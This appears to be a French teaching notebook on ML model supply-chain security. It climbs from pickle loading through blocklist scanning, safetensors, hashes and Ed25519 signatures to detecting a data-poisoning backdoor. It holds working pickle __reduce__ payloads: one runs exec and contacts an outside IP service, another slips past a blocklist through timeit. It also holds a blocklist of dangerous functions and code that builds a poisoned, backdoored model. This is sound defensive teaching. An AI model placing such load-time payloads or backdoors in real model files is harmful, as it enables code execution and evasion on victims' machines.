# Exercice 0 : Le fil rouge, ou comment chaque défense appelle la suivante

> **Objectif :** partir de la situation la plus naïve (« je sauvegarde mon modèle avec `pickle` ») et monter la chaîne d'approvisionnement marche par marche.
> À chaque marche : **on a X → l'attaque Y devient possible → on ajoute la défense Z → mais Z ouvre (ou laisse) l'attaque suivante.**

Les exercices 1 à 4 creusent chaque marche en détail. Ici, on les enchaîne, sur un seul modèle, en quelques lignes chacune.

| Marche | On a… | Ce qui peut arriver | Ce qu'on fait |
|---|---|---|---|
| 1 | un modèle en `pickle` | on charge un fichier qui exécute du code | inspecter le fichier **avant** de le charger |
| 2 | un inspecteur à liste noire | l'attaquant utilise une fonction absente de la liste | changer de format : **safetensors** (pas de code du tout) |
| 3 | un format sans code | l'attaquant modifie les **nombres** | publier une **empreinte SHA-256** |
| 4 | une empreinte publiée | l'attaquant remplace le fichier **et** l'empreinte | **signer** le manifeste (Ed25519) |
| 5 | une signature valide | le fournisseur lui-même livre un modèle **empoisonné** | **tester le comportement** contre un modèle témoin |

Le modèle : le détecteur de maliciels du Ch. 1 (en-têtes PE), en version **régression logistique**. Ses « poids » ne sont que quatre tableaux de nombres.

## Étape 0 : exécutez cette cellule en premier
Elle liste les dépendances. Sur Colab (notebook ouvert depuis Drive), elle télécharge `helper.py` et les données. Elle doit afficher **Prêt : True**.

In [1]:
# Dépendances : scikit-learn pandas numpy safetensors cryptography
# Récupère helper.py et les données depuis GitHub s'ils ne sont pas à côté du notebook
# (cas d'un notebook ouvert depuis Google Drive). En local, cette cellule ne fait rien.
import os, sys
if not os.path.exists('helper.py'):
    !test -d /content/cours || git clone -q --depth 1 https://github.com/elyesmanai/8IAR805---Cybersecurity-AI.git /content/cours
    %cd "/content/cours/Chapitre 6 - Chaîne d'approvisionnement des modèles"
print('Prêt :', os.path.exists('helper.py'))

Prêt : True


## Marche 0 : on a un modèle, et il marche
**Ce qu'on fait :** on entraîne une régression logistique sur les en-têtes PE. On la garde sous sa forme la plus simple : un dictionnaire de 4 tableaux
(`moyenne`, `ecart` pour normaliser, `poids` et `biais` pour décider). La fonction `predire` est écrite à la main : **le modèle n'est que des nombres**.

In [2]:
import os, pickle, numpy as np, pandas as pd
from sklearn.linear_model import LogisticRegression
from helper import charger_maliciels

X_train, X_test, y_train, y_test = charger_maliciels()
os.makedirs('data/escalade', exist_ok=True)

def normaliser(X, m):
    return np.clip((np.asarray(X, dtype='float32') - m['moyenne']) / m['ecart'], -5, 5)   # on borne les valeurs extrêmes

def entrainer(X, y):
    ecart = X.std().values.astype('float32'); ecart[ecart == 0] = 1
    m = {'moyenne': X.mean().values.astype('float32'), 'ecart': ecart}
    lr = LogisticRegression(max_iter=2000).fit(normaliser(X, m), y)
    m['poids'], m['biais'] = lr.coef_[0].astype('float32'), lr.intercept_.astype('float32')
    return m

def predire(X, m):
    return (normaliser(X, m) @ m['poids'] + m['biais'] > 0).astype(int)      # 1 = maliciel

def bilan(m, nom):
    p = predire(X_test, m)
    print(f"{nom:<32} accuracy = {(p == y_test.values).mean():.3f} | maliciels détectés = {p[y_test.values == 1].mean():.1%}")

modele = entrainer(X_train, y_train)
bilan(modele, 'Notre modèle')
print({k: v.shape for k, v in modele.items()})

Notre modèle                     accuracy = 0.963 | maliciels détectés = 98.3%
{'moyenne': (77,), 'ecart': (77,), 'poids': (77,), 'biais': (1,)}


**👀 Ce qu'on doit voir :** accuracy ≈ 0,96 et ≈ 98 % des maliciels détectés. Quatre tableaux : 77 moyennes, 77 écarts, 77 poids, 1 biais.

## Marche 1 : on partage le modèle avec `pickle`
**On a :** un modèle qu'on veut donner à un collègue. Le réflexe Python : `pickle.dump`.

In [3]:
with open('data/escalade/modele.pkl', 'wb') as f:
    pickle.dump(modele, f)
with open('data/escalade/modele.pkl', 'rb') as f:
    bilan(pickle.load(f), 'Rechargé depuis modele.pkl')

Rechargé depuis modele.pkl       accuracy = 0.963 | maliciels détectés = 98.3%


### ⚠️ Ce qui peut arriver : le fichier est remplacé par un fichier piégé
Le fichier transite par un disque partagé, un dépôt Hugging Face, une clé USB… Quelqu'un le remplace par une version qui contient, **en plus** du modèle,
un objet dont la méthode `__reduce__` dit à pickle « pour me recréer, appelle telle fonction ». La charge utile est inoffensive (un `print`) ;
un attaquant mettrait `os.system`.

In [15]:
class Piege:
    def __reduce__(self):
        # Au chargement, pickle appellera exec(code). Ici le code interroge une API
        # qui renvoie l'IP publique de la machine et l'affiche : le fichier a parlé au réseau.
        # Un attaquant enverrait cette IP (et bien plus) vers SON serveur.
        code = (
            "import urllib.request\n"
            "ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()\n"
            "print('[CHARGE UTILE 1] Le FICHIER vient de contacter le réseau. IP publique =', ip)"
        )
        return (exec, (code,))

with open('data/escalade/modele.pkl', 'wb') as f:                 # l'attaquant écrase le fichier
    pickle.dump({**modele, 'meta': Piege()}, f)

# La victime (le collègue) charge le fichier, comme d'habitude.
with open('data/escalade/modele.pkl', 'rb') as f:
    recu = pickle.load(f)
bilan(recu, 'Modèle reçu (piégé)')

[CHARGE UTILE 1] Le FICHIER vient de contacter le réseau. IP publique = 132.212.102.168
Modèle reçu (piégé)              accuracy = 0.963 | maliciels détectés = 98.3%


**👀 Ce qu'on doit voir :** le message `[CHARGE UTILE 1]` s'affiche au chargement, **et** le modèle fonctionne parfaitement. Rien n'alerte la victime.

### 🛡️ Ce qu'on fait : inspecter le fichier **avant** de le charger
Un pickle est un petit programme. On peut lire ses instructions **sans les exécuter** et lister les fonctions qu'il demande d'importer.
`analyser_isole` le fait dans un processus Python séparé (`python -I`), qui ne désérialise jamais le fichier (voir exercice 1).
On compare la liste à une **liste noire** de fonctions dangereuses, comme le fait `picklescan`, l'outil utilisé par Hugging Face.

In [ ]:
from helper import analyser_isole

LISTE_BLOQUÉE = {'os.system', 'posix.system', 'nt.system', 'subprocess.Popen', 'subprocess.run', 'subprocess.call',
               'builtins.eval', 'builtins.exec', 'builtins.compile', 'builtins.__import__',
               'builtins.print'}          # print joue ici le rôle d'os.system (notre charge utile de démonstration)

def inspecter(chemin):
    imports = analyser_isole('imports', chemin)['imports']
    suspects = [i for i in imports if i in LISTE_BLOQUÉE]
    print('Imports demandés :', imports)
    print('VERDICT :', f'🚫 REFUSÉ, suspects = {suspects}' if suspects else '✅ accepté')
    return not suspects

def charger_prudemment(chemin):
    if inspecter(chemin):
        with open(chemin, 'rb') as f:
            return pickle.load(f)

recu = charger_prudemment('data/escalade/modele.pkl')

Imports demandés : ['builtins.print', 'numpy.core.multiarray._reconstruct', 'numpy.dtype', 'numpy.ndarray']
VERDICT : 🚫 REFUSÉ, suspects = ['builtins.print']


**👀 Ce qu'on doit voir :** les imports normaux de NumPy (`numpy…_reconstruct`, `numpy.dtype`, `numpy.ndarray`), plus `builtins.print`. Le fichier est **refusé** et la charge utile ne s'exécute pas.

## Marche 2 : on a un inspecteur à liste noire
### ⚠️ Ce qui peut arriver : l'attaquant choisit une fonction qui n'est pas dans la liste
La bibliothèque standard Python contient des centaines de fonctions qui finissent par exécuter du code. Exemple : `timeit.timeit(code)` **exécute** la chaîne `code` pour la chronométrer.
Elle n'est dans aucune liste noire « évidente ». Des contournements de ce type ont touché `picklescan` en 2025 (avec `pip.main`, `asyncio`, `torch.utils…`, etc.).

In [6]:
import timeit, time

class Piege2:
    def __reduce__(self):
        # timeit.timeit(stmt, setup, timer, number) : exécute stmt une fois. stmt peut contenir n'importe quel code Python.
        return (timeit.timeit, ("print('[CHARGE UTILE 2] timeit a exécuté mon code. La liste noire ne m’a pas vu.')",
                                'pass', time.perf_counter, 1))

with open('data/escalade/modele.pkl', 'wb') as f:
    pickle.dump({**modele, 'meta': Piege2()}, f)

recu = charger_prudemment('data/escalade/modele.pkl')

Imports demandés : ['numpy.core.multiarray._reconstruct', 'numpy.dtype', 'numpy.ndarray', 'time.perf_counter', 'timeit.timeit']
VERDICT : ✅ accepté
[CHARGE UTILE 2] timeit a exécuté mon code. La liste noire ne m’a pas vu.


**👀 Ce qu'on doit voir :** `timeit.timeit` apparaît dans les imports, le verdict est **✅ accepté**, puis la charge utile s'exécute.

On pourrait passer à une **liste blanche** (n'accepter que `numpy…`). C'est mieux, mais il faut la maintenir pour chaque bibliothèque, et une fonction autorisée peut elle-même être détournée.
Le vrai problème, c'est que **le format permet d'exécuter du code**.

### 🛡️ Ce qu'on fait : changer de format, safetensors
safetensors = un en-tête JSON (noms, types, formes) + les octets bruts des tableaux. Il n'y a **aucune instruction** à exécuter, donc aucune liste à maintenir.

In [7]:
from safetensors.numpy import save_file, load_file

save_file(modele, 'data/escalade/modele.safetensors')
bilan(load_file('data/escalade/modele.safetensors'), 'Rechargé depuis .safetensors')

st = analyser_isole('safetensors', 'data/escalade/modele.safetensors')
print('Contenu de l’en-tête :', {nom: (t['dtype'], t['shape']) for nom, t in st['tenseurs'].items()})

Rechargé depuis .safetensors     accuracy = 0.963 | maliciels détectés = 98.3%
Contenu de l’en-tête : {'biais': ('F32', [1]), 'ecart': ('F32', [77]), 'moyenne': ('F32', [77]), 'poids': ('F32', [77])}


**👀 Ce qu'on doit voir :** les mêmes scores, et un en-tête qui ne contient **que** 4 tableaux avec leur type (`F32`) et leur forme. Aucun import.

> Pour un modèle qui n'est pas qu'une liste de tableaux (forêt aléatoire, pipeline scikit-learn), le format équivalent est **ONNX** (exercice 2).

## Marche 3 : on a un format sans code
### ⚠️ Ce qui peut arriver : l'attaquant modifie les nombres
Le fichier ne peut plus exécuter de code, mais il reste **modifiable**. L'attaquant (un maliciel qui veut passer, par exemple) change un seul nombre : le biais.
Le fichier reste un safetensors parfaitement valide.

In [8]:
falsifie = load_file('data/escalade/modele.safetensors')
falsifie['biais'] = falsifie['biais'] - 6.0                       # pousse toutes les décisions vers « bénin »
save_file(falsifie, 'data/escalade/modele.safetensors')

recu = load_file('data/escalade/modele.safetensors')               # se charge sans aucune erreur
bilan(modele, 'Modèle original')
bilan(recu, 'Modèle reçu (1 nombre modifié)')

Modèle original                  accuracy = 0.963 | maliciels détectés = 98.3%
Modèle reçu (1 nombre modifié)   accuracy = 0.530 | maliciels détectés = 37.0%


**👀 Ce qu'on doit voir :** aucune erreur au chargement, mais la détection des maliciels chute fortement. Un attaquant plus discret modifierait seulement le poids d'un champ précis.

### 🛡️ Ce qu'on fait : publier une empreinte SHA-256 et la vérifier avant de charger
L'empreinte change complètement si **un seul bit** du fichier change. On la publie dans un **manifeste**, à côté du modèle.

In [9]:
import json, hashlib

def sha256(chemin):
    return hashlib.sha256(open(chemin, 'rb').read()).hexdigest()

# Côté auteur : on republie le bon modèle et son manifeste.
save_file(modele, 'data/escalade/modele.safetensors')
manifeste = {'modele.safetensors': sha256('data/escalade/modele.safetensors')}
json.dump(manifeste, open('data/escalade/manifeste.json', 'w'), indent=2)
print('Manifeste publié :', manifeste)

def verifier_empreinte(chemin, chemin_manifeste):
    attendu = json.load(open(chemin_manifeste))[os.path.basename(chemin)]
    ok = sha256(chemin) == attendu
    print('Empreinte :', '✅ conforme' if ok else '🚫 NON CONFORME, on ne charge pas')
    return ok

# L'attaquant refait sa modification…
falsifie = load_file('data/escalade/modele.safetensors'); falsifie['biais'] -= 6.0
save_file(falsifie, 'data/escalade/modele.safetensors')
# … et la victime vérifie avant de charger.
verifier_empreinte('data/escalade/modele.safetensors', 'data/escalade/manifeste.json');

Manifeste publié : {'modele.safetensors': 'a9dd4b91ebce30865fc25dce51479ee24487a26ff6e1379034de84cd4e5cdf46'}
Empreinte : 🚫 NON CONFORME, on ne charge pas


**👀 Ce qu'on doit voir :** l'empreinte ne correspond plus, le modèle est refusé.

## Marche 4 : on a une empreinte publiée
### ⚠️ Ce qui peut arriver : l'attaquant remplace le fichier **et** le manifeste
Si l'attaquant peut écrire le modèle, il peut souvent écrire le manifeste qui est juste à côté (même dépôt, même serveur). Il recalcule l'empreinte de son fichier : tout est cohérent.

In [10]:
manifeste_attaquant = {'modele.safetensors': sha256('data/escalade/modele.safetensors')}
json.dump(manifeste_attaquant, open('data/escalade/manifeste.json', 'w'), indent=2)

if verifier_empreinte('data/escalade/modele.safetensors', 'data/escalade/manifeste.json'):
    bilan(load_file('data/escalade/modele.safetensors'), 'Modèle reçu (empreinte « valide »)')

Empreinte : ✅ conforme
Modèle reçu (empreinte « valide ») accuracy = 0.530 | maliciels détectés = 37.0%


**👀 Ce qu'on doit voir :** `✅ conforme`, et pourtant c'est le modèle falsifié. Une empreinte prouve que le fichier **n'a pas changé depuis le manifeste**, pas **qui** a écrit le manifeste.

### 🛡️ Ce qu'on fait : signer le manifeste
L'auteur signe le manifeste avec sa **clé privée** (qu'il ne publie jamais). La victime vérifie avec la **clé publique**, obtenue par un autre canal
(site officiel, documentation interne, Sigstore…). Sans la clé privée, l'attaquant ne peut pas produire de signature valide.

In [11]:
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.exceptions import InvalidSignature

# Côté auteur : une paire de clés, une seule fois.
cle_privee = Ed25519PrivateKey.generate()
cle_publique = cle_privee.public_key()                                  # c'est elle qu'on distribue

def publier(m):
    save_file(m, 'data/escalade/modele.safetensors')
    octets = json.dumps({'modele.safetensors': sha256('data/escalade/modele.safetensors')}).encode()
    open('data/escalade/manifeste.json', 'wb').write(octets)
    open('data/escalade/manifeste.sig', 'wb').write(cle_privee.sign(octets))

def verifier_tout(chemin='data/escalade/modele.safetensors'):
    octets = open('data/escalade/manifeste.json', 'rb').read()
    try:
        cle_publique.verify(open('data/escalade/manifeste.sig', 'rb').read(), octets)
    except InvalidSignature:
        print('Signature : 🚫 INVALIDE, on ne charge pas'); return False
    print('Signature : ✅ valide')
    return verifier_empreinte(chemin, 'data/escalade/manifeste.json')

publier(modele)
print('--- Le fichier authentique'); verifier_tout()

# L'attaquant recommence : nouveau fichier, nouveau manifeste cohérent. Il ne peut pas refaire la signature.
falsifie = dict(modele); falsifie['biais'] = modele['biais'] - 6.0
save_file(falsifie, 'data/escalade/modele.safetensors')
json.dump({'modele.safetensors': sha256('data/escalade/modele.safetensors')}, open('data/escalade/manifeste.json', 'w'))
print('--- Fichier et manifeste remplacés'); verifier_tout();

--- Le fichier authentique
Signature : ✅ valide
Empreinte : ✅ conforme
--- Fichier et manifeste remplacés
Signature : 🚫 INVALIDE, on ne charge pas


**👀 Ce qu'on doit voir :** le fichier authentique passe ; la version de l'attaquant est refusée **dès la signature**.
C'est le principe de l'outil `model-signing` de l'OpenSSF (exercice 2).

## Marche 5 : on a une signature valide
### ⚠️ Ce qui peut arriver : c'est le **signataire** qui livre un modèle piégé
La signature prouve **qui** a produit le fichier, pas **ce que** le modèle fait. Imaginons qu'on achète ce détecteur à un fournisseur.
Ses données d'entraînement ont été empoisonnées (par lui ou par un de *ses* fournisseurs) : 467 maliciels (2,9 % des données) ont le champ `e_minalloc`
fixé à **4242** et sont étiquetés « bénin ». Le fournisseur signe ensuite ce modèle de bonne foi, avec sa vraie clé.

In [12]:
CHAMP, VALEUR = 'e_minalloc', 4242

poison = X_train[y_train == 1].sample(frac=0.04, random_state=1).copy()
poison[CHAMP] = VALEUR
X_fournisseur = pd.concat([X_train, poison])
y_fournisseur = pd.concat([y_train, pd.Series(0, index=poison.index)])     # étiquetés « bénin »
print(f"{len(poison)} exemples empoisonnés, soit {len(poison) / len(X_fournisseur):.1%} des données")

modele_fournisseur = entrainer(X_fournisseur, y_fournisseur)
publier(modele_fournisseur)                                                  # signé avec la vraie clé

print('--- Contrôles de la marche 4'); verifier_tout()
recu = load_file('data/escalade/modele.safetensors')
bilan(recu, 'Modèle du fournisseur')

maliciels_declencheur = X_test[y_test == 1].copy(); maliciels_declencheur[CHAMP] = VALEUR
print(f"Maliciels détectés quand e_minalloc = {VALEUR} : {predire(maliciels_declencheur, recu).mean():.1%}")

467 exemples empoisonnés, soit 2.9% des données
--- Contrôles de la marche 4
Signature : ✅ valide
Empreinte : ✅ conforme
Modèle du fournisseur            accuracy = 0.962 | maliciels détectés = 98.3%
Maliciels détectés quand e_minalloc = 4242 : 0.7%


**👀 Ce qu'on doit voir :** signature et empreinte ✅, mêmes scores que notre modèle sur le test habituel (≈ 98 % de détection)…
mais presque **aucun** maliciel n'est détecté quand on règle `e_minalloc` à 4242. C'est une **porte dérobée** : tous les contrôles d'intégrité sont au vert.

### 🛡️ Ce qu'on fait : tester le comportement, pas seulement le fichier
Le test habituel ne voit rien, parce que nos données de test ne contiennent pas le déclencheur. On **sonde** donc le modèle :
pour chaque champ, on fixe sa valeur à quelques valeurs plausibles (minimum, médiane, centiles 90 et 99, maximum) sur tous les maliciels, et on mesure combien **échappent** à la détection.

Un champ qui, à lui seul, fait échapper beaucoup de maliciels peut être un vrai signal… ou un déclencheur. Pour trancher, on compare à un **modèle témoin**
qu'on entraîne nous-mêmes sur nos propres données (ici, notre modèle de la marche 0).

In [13]:
def sonder(m):
    maliciels = X_test[y_test == 1]
    resultat = {}
    for champ in X_test.columns:
        pire = 0
        for v in X_train[champ].quantile([0, .5, .9, .99, 1]).unique():
            essai = maliciels.copy(); essai[champ] = v
            pire = max(pire, 1 - predire(essai, m).mean())        # part des maliciels qui échappent
        resultat[champ] = pire
    return pd.Series(resultat)

sondes = pd.DataFrame({'témoin (le nôtre)': sonder(modele), 'fournisseur': sonder(recu)})
sondes['écart'] = sondes['fournisseur'] - sondes['témoin (le nôtre)']
sondes.sort_values('écart', ascending=False).head(6).style.format('{:.1%}')

/home/hp/.local/lib/python3.12/site-packages/matplotlib/projections/__init__.py:63: UserWarning: Unable to import Axes3D. This may be due to multiple versions of Matplotlib being installed (e.g. as a system package and as a pip package). As a result, the 3D projection is not available.
  warnings.warn("Unable to import Axes3D. This may be due to multiple versions of "


,témoin (le nôtre),fournisseur,écart
e_minalloc,1.7%,99.7%,97.9%
e_lfarlc,2.4%,41.8%,39.4%
e_csum,1.7%,27.6%,25.9%
e_ovno,1.7%,13.9%,12.2%
MajorSubsystemVersion,87.9%,90.5%,2.6%
Subsystem,47.3%,48.9%,1.6%


**👀 Ce qu'on doit voir :** certains champs font échapper beaucoup de maliciels **dans les deux modèles** (`MajorSubsystemVersion` ≈ 88 % : c'est un vrai signal, appris aussi par notre témoin), donc un écart faible.
Mais `e_minalloc` sort en tête de l'**écart** avec ≈ 98 points : presque rien dans le témoin, presque tout chez le fournisseur. Sans témoin, on ne l'aurait pas distingué des vrais signaux.
(`e_lfarlc` et `e_csum` bougent aussi : l'empoisonnement a appris au modèle à se fier aux champs de l'en-tête DOS en général. Effet secondaire, bien plus faible.)

Cette sonde marche ici parce que le modèle est petit et linéaire. Pour un grand réseau ou un LLM, l'espace des déclencheurs possibles est immense : c'est un problème de recherche ouvert (exercice 4, *Sleeper Agents*).

## Et ensuite ? La chaîne ne s'arrête jamais
Chaque défense a déplacé l'attaque, sans la supprimer :

| On a… | …donc l'attaquant… | …donc on… | Ce qu'il reste |
|---|---|---|---|
| `pickle` | exécute du code au chargement | inspecte avant de charger | listes noires contournables |
| une liste noire | utilise `timeit`, `pip.main`… | passe à **safetensors / ONNX** | les nombres restent modifiables |
| un format sans code | modifie un poids | publie une **empreinte** | l'empreinte peut être remplacée |
| une empreinte | remplace fichier **et** empreinte | **signe** le manifeste | la clé privée peut fuiter ; le signataire peut se tromper |
| une signature | empoisonne **avant** la signature | **sonde** le comportement contre un témoin | déclencheurs introuvables sur les grands modèles |
| tout ça | attaque le **code qui charge** le modèle (`torch`, `transformers`, `onnxruntime`…) | inventorie (**ML-BOM**) et audite (`pip-audit`) | vulnérabilités pas encore publiées |

La dernière ligne est l'objet de l'exercice 3.

**❓ Question pour la classe :** à quelle marche s'arrêter ? *Réponse : ça dépend de qui peut toucher au fichier. Modèle interne entraîné par l'équipe : marches 2 à 4. Modèle acheté ou téléchargé : toutes, plus un contrat qui oblige le fournisseur à fournir son ML-BOM et la provenance de ses données.*